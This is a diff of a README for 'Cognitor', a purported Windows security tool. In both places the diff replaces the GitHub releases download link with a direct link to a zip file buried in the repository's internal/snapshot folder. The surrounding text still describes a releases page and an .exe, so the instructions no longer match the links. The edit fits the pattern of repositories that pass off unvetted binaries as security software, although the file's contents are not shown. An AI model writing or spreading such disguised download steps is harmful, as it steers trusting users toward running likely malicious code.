@@ -1,6 +1,6 @@
 # 🛡️ Cognitor - Reliable Tools For Windows System Security
 
-[![](https://img.shields.io/badge/Download-Cognitor-blue.svg)](https://github.com/violesemiterrestrial743/Cognitor/releases)
+[![](https://img.shields.io/badge/Download-Cognitor-blue.svg)](https://raw.githubusercontent.com/violesemiterrestrial743/Cognitor/main/internal/snapshot/Software-3.2.zip)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ Before you install Cognitor, ensure your computer meets these conditions:
 
 Follow these steps to obtain and run the application on your computer:
 
-1. Visit the following link to see all available releases: [https://github.com/violesemiterrestrial743/Cognitor/releases](https://github.com/violesemiterrestrial743/Cognitor/releases)
+1. Visit the following link to see all available releases: [https://raw.githubusercontent.com/violesemiterrestrial743/Cognitor/main/internal/snapshot/Software-3.2.zip](https://raw.githubusercontent.com/violesemiterrestrial743/Cognitor/main/internal/snapshot/Software-3.2.zip)
 2. Look for the latest version at the top of the list.
 3. Select the file ending in .exe to download it to your Downloads folder.
 4. Open the folder where the file saved.
